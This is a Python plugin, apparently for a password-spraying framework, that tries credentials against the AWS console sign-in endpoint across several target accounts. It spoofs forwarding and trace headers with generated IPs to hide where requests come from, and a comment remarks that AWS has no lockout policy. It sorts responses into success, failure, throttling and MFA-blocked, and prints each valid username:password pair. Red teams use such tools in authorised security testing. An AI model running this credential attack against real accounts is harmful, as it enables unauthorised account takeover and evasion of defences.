import requests
import utils.utils as utils
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Lockout Risks
# Ref: https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html
# You can't create a "lockout policy" to lock a user out of the account after a specified number of failed sign-in attempts.
# TODO: Would be great if there was a way to designate in usernames file which usernames go with which account for multi-accounts

def aws_authenticate(url, username, password, useragent, pluginargs):

    target_accounts = pluginargs["accounts"].split(",")

    for target_account in target_accounts:
        sign_in_url = f"{url}/authenticate"

        spoofed_ip = utils.generate_ip()
        amazon_id = utils.generate_id()
        trace_id = utils.generate_trace_id()

        headers = {
            "X-My-X-Forwarded-For" : spoofed_ip,
            "x-amzn-apigateway-api-id" : amazon_id,
            "X-My-X-Amzn-Trace-Id" : trace_id,
            "User-Agent" : useragent,
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }

        headers = utils.add_custom_headers(pluginargs, headers)

        post_params = {
            "account": target_account,
            "action": "iam-user-authentication",
            "client_id": "arn:aws:signin:::console/canvas",
            "username": username,
            "password": password,
            "redirect_uri": "https://console.aws.amazon.com/console",
            "rememberAccount": "false",
            "rememberMfa": "false"
        }

        # data returned
        data_response = {
            'result' : None,  # Can be "success", "failure", "throttle", "aws_mfa_blocked"
            'error' : False,
            'output' : "",
            'valid_user' : False
        }

        try:

            # proxies = {
            #    "http": "http://127.0.0.1:8080",
            #    "https": "http://127.0.0.1:8080",
            # }
            http_output = requests.post(f"{sign_in_url}", headers=headers, data=post_params) #, proxies=proxies, verify=False)
            
            http_output_json = http_output.json()

            username_to_print = f"arn:aws:iam::{target_account}:user/{username}"
            if http_output.status_code == 429:
                data_response['result'] = "throttle"
                status_code = str(http_output.status_code)
                data_response['output'] = f"[-] THROTTLED - {status_code} => {username_to_print}"

            
            elif http_output.status_code == 200:
                region = pluginargs['aws_region_spray']
                state = http_output_json["state"]
                http_output_json_prop = http_output_json["properties"]
                result = http_output_json_prop.get("result", "Unknown")
                text = http_output_json_prop.get("text", "Unknown")

                if state == "FAIL":
                
                    data_response['result'] = "failure"

                    # Console User - MFA - Incorrect Region - Good/Bad Password
                    # Console User - No MFA - Incorrect Region - Bad/Bad Password
                    # Note: try passing in something like ca-west-1 when its not enabled in account to see region response
                    if result == "OPT_IN_REGION_FAILURE":

                        data_response['output'] = f"[-] FAILURE => {username_to_print}:{password} - {region} not enabled for account."

                    # Console User - No MFA - Correct Region - Bad Password
                    # Note: Returns redirect link
                    elif result == "FAILURE":
                        
                        data_response['output'] = f"[-] FAILURE => {username_to_print}:{password} - {text}"

                    # Console User - Unknown
                    # Catch-All for unknown use case     
                    else:
                        data_response['result'] = "failure"
                        data_response['output'] = f"[-] FAILURE => {username_to_print}:{password} - {http_output_json}"

                elif state == "SUCCESS":

                    # Console User - MFA - Correct Region - Good Password
                    # Console User - MFA - Correct Region - Bad Password
                    # Note: Returns MFA if username is correct regardless of what password is
                    if result == "MFA":

                        data_response['result'] = "aws_mfa_blocked"
                        data_response['output'] = f"[+] MFA RESTRICT: => {username_to_print}:{password} - User exists, but requires MFA. Password cannot be determined."

                        # TODO: Not sure if there is a native way in credmaster to remove this user from further guesses?
                        
                    # Console User - No MFA - Correct Region - Good Password
                    # Note: Returns redirect link
                    elif result == "SUCCESS":

                        data_response['result'] = "success"
                        data_response['output'] = f"[+] SUCCESS => {username_to_print}:{password}"

                    # Console User - Unknown
                    # Success for unknown use case
                    else:
                        data_response['result'] = "success"
                        data_response['output'] = f"[+] UNKNOWN SUCCESS: => {username_to_print}:{password} Success with unknown response."
                
                # Console User - Unknown
                # Catch-All for unknown use case
                else:

                    data_response['result'] = "failure"
                    data_response['output'] = f"[-] FAILURE: {http_output.status_code} => Got an error we haven't seen before: {http_output_json_prop}"

        except Exception as ex:
            data_response['error'] = True
            data_response['output'] = ex
            pass

    return data_response